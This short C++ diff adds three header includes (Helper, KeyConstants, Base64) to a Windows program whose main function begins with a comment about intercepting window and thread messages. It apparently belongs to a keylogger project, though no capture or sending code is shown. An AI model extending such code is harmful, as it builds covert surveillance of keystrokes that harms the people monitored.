@@ -1,5 +1,8 @@
 #include <iostream>
 #include <windows.h>
+#include "Helper.h"
+#include "KeyConstants.h"
+#include "Base64.h"
 
 int main(){
     // Intercept any window and thread messages
